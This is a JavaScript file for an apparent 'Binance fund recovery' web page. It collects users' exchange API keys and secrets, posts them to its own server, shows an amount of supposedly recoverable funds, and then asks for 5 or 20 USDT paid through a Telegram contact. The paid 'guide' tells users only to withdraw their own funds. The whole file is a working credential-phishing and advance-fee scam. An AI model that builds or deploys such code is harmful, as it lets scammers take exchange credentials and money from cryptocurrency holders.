document.addEventListener('DOMContentLoaded', () => {
    const connectBtn = document.getElementById('connectBtn');
    const scanBtn = document.getElementById('scanBtn');
    const apiKeyInput = document.getElementById('apiKey');
    const apiSecretInput = document.getElementById('apiSecret');
    const resultDiv = document.getElementById('result');
    const paymentDiv = document.getElementById('payment');
    const guideDiv = document.getElementById('guide');
    const scanStep = document.getElementById('scanStep');
    const paymentStep = document.getElementById('paymentStep');

    let totalUSD = 0;
    let walletData = null;

    connectBtn.addEventListener('click', async (e) => {
        e.preventDefault();
        const apiKey = apiKeyInput.value;
        const apiSecret = apiSecretInput.value;

        try {
            const response = await fetch('/api/scan', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ apiKey, apiSecret })
            });

            const data = await response.json();

            if (data.success) {
                walletData = data;
                totalUSD = parseFloat(data.totalUSD);
                scanStep.style.display = 'block';
                paymentStep.style.display = 'block';
                resultDiv.innerHTML = `🔍 Found potential funds: <span class="highlight">$${data.totalUSD}</span>`;
                showPaymentOptions();
            } else {
                alert('Error: ' + data.error);
            }
        } catch (error) {
            alert('Connection error');
        }
    });

    function showPaymentOptions() {
        paymentDiv.innerHTML = `
            <p>Choose recovery option:</p>
            <button onclick="showPremium()">Premium Guide ($5)</button>
            <button onclick="showVIP()">VIP Service ($20)</button>
        `;
    }

    // Modify the showPremium and showVIP functions
    window.showPremium = async () => {
        paymentDiv.innerHTML = `
            <p>Send 5 USDT to:</p>
            <p class="address">bnb1qxy2kgdxgj...your-bnb-address</p>
            <div class="telegram-proof">
                <p>After payment:</p>
                <a href="https://t.me/BinanceHunterSupport" target="_blank" class="telegram-button">
                    📩 Send Payment Proof on Telegram
                </a>
                <small>Include: Transaction Hash + Your Wallet Address</small>
            </div>
        `;
    }

    window.showVIP = async () => {
        paymentDiv.innerHTML = `
            <p>Send 20 USDT to:</p>
            <p class="address">bnb1qxy2kgdxgj...your-bnb-address</p>
            <div class="telegram-proof">
                <p>After payment:</p>
                <a href="https://t.me/BinanceHunterSupport" target="_blank" class="telegram-button">
                    📩 Send Payment Proof on Telegram
                </a>
                <small>Include: Transaction Hash + Your Wallet Address</small>
            </div>
        `;
    }
    // Add this in script.js after paymentDiv.innerHTML
    const telegramUsername = '@BinanceHunterSupport';
    guideDiv.style.display = 'block';
    guideDiv.innerHTML = `
        <h3>📬 Next Steps:</h3>
        <ol>
            <li>Complete your USDT payment</li>
            <li>Screenshot the transaction</li>
            <li><a href="https://t.me/${telegramUsername}" target="_blank">Contact us on Telegram</a> with:
                <ul>
                    <li>Your transaction hash</li>
                    <li>Wallet address</li>
                    <li>Payment screenshot</li>
                </ul>
            </li>
        </ol>
        <p>Processing time: 15-30 minutes after verification</p>
    `;

    window.checkPayment = async (type) => {
        // In real implementation, verify blockchain transaction
        guideDiv.style.display = 'block';
        guideDiv.innerHTML = `
            <h3>${type === 'premium' ? 'Premium Recovery Guide' : 'VIP Service Activated'}</h3>
            ${type === 'premium' ? `
            <ol>
                <li>Login to Binance account</li>
                <li>Go to Wallet -> Spot</li>
                <li>For each asset:
                    <ul>
                        <li>Convert dust to BNB</li>
                        <li>Withdraw funds</li>
                    </ul>
                </li>
            </ol>
            ` : `
            <p>Our team will handle your fund recovery within 24 hours!</p>
            `}
            <p>Need help? Contact @BinanceHunterSupport</p>
        `;
    };
});